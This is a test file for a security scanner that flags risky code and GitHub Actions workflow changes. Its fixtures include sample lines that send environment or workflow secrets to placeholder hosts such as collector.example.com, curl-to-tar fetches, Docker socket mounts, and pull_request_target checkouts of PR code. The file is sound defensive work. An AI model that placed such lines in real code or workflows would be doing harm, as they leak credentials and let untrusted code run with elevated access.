import test from 'node:test';
import assert from 'node:assert/strict';
import { detectJsCapability } from '../dist/detectors/js-capability.js';
import { detectWorkflowPermissions } from '../dist/detectors/workflow-permissions.js';
import { createReport } from '../dist/report.js';

test('js detector flags external fetch', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: "  const response = await fetch('https://api.example.com/v1/events');"
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.external_fetch_added');
});

test('js detector flags env secret exfiltration over external fetch', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 8,
      content:
        "await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } });"
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.external_fetch_added'));
  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.surface, 'source');
  assert.equal(exfilFinding.severity, 'high');
});

test('js detector flags bracket-notation env secret access in inline exfiltration', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 8,
      content:
        "await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${process.env['API_TOKEN']}` } });"
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern'));
});

test('js detector tracks bracket-notation env secret variables across lines', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: "const apiToken = process.env[\"API_TOKEN\"];"
    },
    {
      file: 'src/api/sync.ts',
      line: 6,
      content:
        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${apiToken}` } });"
    }
  ]);

  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.line, 6);
});

test('js detector tracks destructured env secret variables', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: 'const { API_TOKEN } = process.env;'
    },
    {
      file: 'src/api/sync.ts',
      line: 6,
      content:
        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${API_TOKEN}` } });"
    }
  ]);

  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.line, 6);
});

test('js detector tracks renamed destructured env secret variables', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: 'const { API_TOKEN: t } = process.env;'
    },
    {
      file: 'src/api/sync.ts',
      line: 6,
      content:
        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${t}` } });"
    }
  ]);

  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.line, 6);
});

test('js detector ignores destructured non-secret-shaped names', () => {
  const findings = detectJsCapability([
    {
      file: 'src/api/sync.ts',
      line: 2,
      content: 'const { NODE_ENV, PORT } = process.env;'
    },
    {
      file: 'src/api/sync.ts',
      line: 6,
      content:
        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${PORT}` } });"
    }
  ]);

  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.equal(exfilFinding, undefined);
});

test('js detector downgrades test file subprocess findings', () => {
  const findings = detectJsCapability([
    {
      file: 'src/utils/format.test.ts',
      line: 4,
      content: 'execSync("npm test");'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.subprocess_spawn_added');
  assert.equal(findings[0].severity, 'low');
});

test('workflow detector flags write permissions', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 6,
      content: '  contents: write'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_permission_write');
});

test('workflow detector flags broader token write scopes', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/pr-triage.yml',
      line: 7,
      content: '  pull-requests: write'
    },
    {
      file: '.github/workflows/pr-triage.yml',
      line: 8,
      content: '  actions: write'
    }
  ]);

  assert.equal(findings.length, 2);
  assert.ok(findings.every((finding) => finding.kind === 'capability_echo.workflow_permission_write'));
  assert.ok(findings.every((finding) => finding.severity === 'high'));
});

test('workflow detector flags secret exfil pattern', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 18,
      content: 'run: curl https://example.com/hook -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"'
    }
  ]);

  assert.equal(findings.length, 2);
  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern'));
});

test('workflow detector flags secret-backed env vars used in external requests', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 17,
      content: '          API_TOKEN: ${{ secrets.API_TOKEN }}'
    },
    {
      file: '.github/workflows/deploy.yml',
      line: 21,
      content: 'run: curl https://example.com/hook -H "Authorization: Bearer $API_TOKEN"'
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_external_curl'));
  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.workflow_secret_exfil_pattern');
  assert.ok(exfilFinding);
  assert.equal(exfilFinding.line, 21);
  assert.equal(exfilFinding.severity, 'high');
});

test('workflow detector flags external curl with a literal URL', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 12,
      content: '      - run: curl https://example.com/bootstrap.sh'
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_external_curl'));
});

test('workflow detector flags external curl when only a variable URL is present', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 12,
      content: '      - run: curl -L $RELEASE_URL | tar xz'
    }
  ]);

  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.workflow_external_curl'));
});

test('workflow detector skips commented-out curl lines', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 12,
      content: '      # run: curl https://example.com/install.sh'
    },
    {
      file: '.github/workflows/ci.yml',
      line: 13,
      content: '# contents: write'
    },
    {
      file: '.github/workflows/ci.yml',
      line: 14,
      content: '#   pull_request_target:'
    }
  ]);

  assert.equal(findings.length, 0);
});

test('workflow detector skips localhost curl invocations', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 12,
      content: '      - run: curl http://localhost:8080/health'
    },
    {
      file: '.github/workflows/ci.yml',
      line: 13,
      content: '      - run: wget http://127.0.0.1:9000/ready'
    }
  ]);

  assert.equal(
    findings.filter((finding) => finding.kind === 'capability_echo.workflow_external_curl').length,
    0
  );
});

test('workflow detector skips curl lines without URL or variable references', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/ci.yml',
      line: 12,
      content: '      - name: curl is required for the next step'
    }
  ]);

  assert.equal(
    findings.filter((finding) => finding.kind === 'capability_echo.workflow_external_curl').length,
    0
  );
});

test('workflow detector flags inherited reusable workflow secrets', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/deploy.yml',
      line: 22,
      content: '    secrets: inherit'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_secrets_inherit');
  assert.equal(findings[0].surface, 'workflow');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].recommendation, /explicit/);
});

test('workflow detector flags Docker socket mounts', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 22,
      content: 'run: docker run -v /var/run/docker.sock:/var/run/docker.sock agent-runner'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_docker_socket_mount');
  assert.equal(findings[0].severity, 'critical');
});

test('workflow detector flags privileged containers', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 24,
      content: 'run: docker run --privileged agent-runner'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_privileged_container');
  assert.equal(findings[0].severity, 'high');
});

test('workflow detector flags pull_request_target triggers', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_pull_request_target');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].recommendation, /pull_request/);
});

test('workflow detector flags pull_request_target workflows that check out PR head code', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 21,
      content: '          ref: ${{ github.event.pull_request.head.sha }}'
    }
  ]);

  const checkoutFinding = findings.find((finding) => finding.kind === 'capability_echo.workflow_pr_head_checkout_on_target');
  assert.ok(checkoutFinding);
  assert.equal(checkoutFinding.severity, 'high');
  assert.equal(checkoutFinding.line, 21);
  assert.match(checkoutFinding.recommendation, /pull_request/);
});

test('workflow detector does not flag PR head checkout without pull_request_target', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 21,
      content: '          ref: ${{ github.event.pull_request.head.sha }}'
    }
  ]);

  assert.equal(findings.length, 0);
});

test('workflow detector flags PR head clone_url under pull_request_target', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '          git clone ${{ github.event.pull_request.head.repo.clone_url }} pr'
    }
  ]);

  const finding = findings.find(
    (item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
  );
  assert.ok(finding);
  assert.equal(finding.line, 18);
});

test('workflow detector flags refs/pull/N/merge fetches under pull_request_target', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 19,
      content: '          git fetch origin refs/pull/${{ github.event.pull_request.number }}/merge'
    }
  ]);

  const finding = findings.find(
    (item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
  );
  assert.ok(finding);
  assert.equal(finding.line, 19);
});

test('workflow detector flags custom-shell PR head checkout under pull_request_target', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 3,
      content: '  pull_request_target:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '          git clone https://github.com/${{ github.event.pull_request.head.repo.full_name }}'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 19,
      content: '          git checkout ${{ github.event.pull_request.head.sha }}'
    }
  ]);

  const findingsForKind = findings.filter(
    (finding) => finding.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
  );
  assert.equal(findingsForKind.length, 2);
  assert.deepEqual(
    findingsForKind.map((finding) => finding.line).sort((a, b) => a - b),
    [18, 19]
  );
});

test('workflow detector flags self-hosted runners', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 12,
      content: '    runs-on: [self-hosted, linux]'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_self_hosted_runner');
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].message, /self-hosted/);
});

test('workflow detector flags multiline self-hosted runner labels', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 12,
      content: '    runs-on:'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 13,
      content: '      - self-hosted'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 14,
      content: '      - linux'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_self_hosted_runner');
  assert.equal(findings[0].line, 13);
});

test('workflow detector flags mutable third-party action refs', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '      - uses: third-party/deploy-agent@main'
    }
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, 'capability_echo.workflow_mutable_action_ref');
  assert.equal(findings[0].surface, 'workflow');
  assert.equal(findings[0].severity, 'medium');
  assert.match(findings[0].recommendation, /commit SHA/);
});

test('workflow detector ignores local and commit-pinned action refs', () => {
  const findings = detectWorkflowPermissions([
    {
      file: '.github/workflows/agent.yml',
      line: 18,
      content: '      - uses: ./.github/actions/build'
    },
    {
      file: '.github/workflows/agent.yml',
      line: 19,
      content: '      - uses: third-party/deploy-agent@0123456789abcdef0123456789abcdef01234567'
    }
  ]);

  assert.equal(findings.length, 0);
});

test('report summarizes mutable workflow action refs with a human label', () => {
  const report = createReport(
    [
      {
        kind: 'capability_echo.source_secret_exfil_pattern',
        surface: 'source',
        severity: 'high',
        file: 'src/api/sync.ts',
        line: 8,
        subject: 'Source secret exfiltration pattern',
        message: 'Added source code sends environment-secret-shaped data to an external endpoint.',
        recommendation: 'Do not send env secrets to external services unless the endpoint and payload are explicitly required.'
      },
      {
        kind: 'capability_echo.workflow_mutable_action_ref',
        surface: 'workflow',
        severity: 'medium',
        file: '.github/workflows/agent.yml',
        line: 18,
        subject: 'GitHub Actions mutable action reference',
        message: 'Workflow uses a mutable third-party action reference.',
        recommendation: 'Pin third-party actions to a reviewed commit SHA before merge.'
      },
      {
        kind: 'capability_echo.workflow_pr_head_checkout_on_target',
        surface: 'workflow',
        severity: 'high',
        file: '.github/workflows/agent.yml',
        line: 21,
        subject: 'GitHub Actions PR-head reference under pull_request_target',
        message:
          'Workflow under pull_request_target references the pull request head (SHA, ref, or repo), which can let untrusted PR code run with the elevated token context.',
        recommendation:
          'Use pull_request for untrusted PR code, or avoid referencing PR head SHA/ref/repo under pull_request_target.'
      },
      {
        kind: 'capability_echo.workflow_secrets_inherit',
        surface: 'workflow',
        severity: 'high',
        file: '.github/workflows/deploy.yml',
        line: 22,
        subject: 'GitHub Actions inherited secrets',
        message: 'Workflow passes all caller secrets to a reusable workflow.',
        recommendation: 'Pass only explicit secrets required by the reusable workflow.'
      }
    ],
    {
      changedFileCount: 1,
      scannedSurfaces: ['workflow']
    }
  );

  assert.deepEqual(report.capabilitySummary, [
    'source secret exfiltration patterns',
    'GitHub Actions mutable action references',
    'GitHub Actions PR-head reference under pull_request_target',
    'GitHub Actions inherited secrets'
  ]);
});
